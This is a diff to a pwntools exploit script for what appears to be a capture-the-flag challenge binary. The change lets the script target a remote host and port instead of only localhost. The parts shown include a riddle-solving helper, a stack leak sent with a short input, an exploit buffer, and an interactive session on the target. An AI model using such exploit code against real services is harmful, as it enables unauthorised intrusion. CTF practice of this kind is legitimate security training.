@@ -2,28 +2,33 @@
 from pwn import *
 context(os='linux',arch='amd64')
 
-# Start the challenge.  It serves on port 6666
-process('./94dd6790cbf7ebfc5b28cc289c480e5e')
+# If a HOST is given on the cmdline, then assume that it is already running there
+if 'HOST' in pwn.args:
+    HOST = pwn.args['HOST']
+    PORT = int(pwn.args.get('PORT', 6666))
+else:
+    # Otherwise start the binary locally
+    HOST = 'localhost'
+    PORT = 6666
+    process('./94dd6790cbf7ebfc5b28cc289c480e5e')
+    sleep(0.1)
 
 #
 # The first thing you must do is solve a riddle on the challenge
 # Create a little helper to do this.
 #
 def solve_riddle(r):
-    log.info("Solving riddle, please wait...")
-    r.send('arsenal\n')
-    r.recvrepeat(1)
-    r.send('gyeongbokgung\n')
-    r.recvrepeat(1)
-    r.send('psy\n')
-    r.recvrepeat(1)
-    r.clean(1)
+    r.sendlineafter('\x00', 'arsenal')
+    r.sendlineafter('\x00', 'gyeongbokgung')
+    r.sendlineafter('\x00', 'psy')
+    r.recvuntil('\x00')
+    log.success("Solved riddle")
 
 #
 # By sending too little data, we can leak stack data
 #
 log.info("Dumping stack...")
-with remote('localhost',6666) as r:
+with remote(HOST, PORT) as r:
     solve_riddle(r)
     r.send('A' + '\x00' * 7)
     stack_leak = r.recvall()
@@ -124,7 +129,7 @@ buf += p64(addresses['memcpy_dst'] + delta)
 
 log.info("Exploit buf:\n%s" % hexdump(buf, 8))
 
-with remote('localhost',6666,timeout=0.5) as r:
+with remote(HOST, PORT, timeout=0.5) as r:
     solve_riddle(r)
     r.send(buf)
     r.interactive()
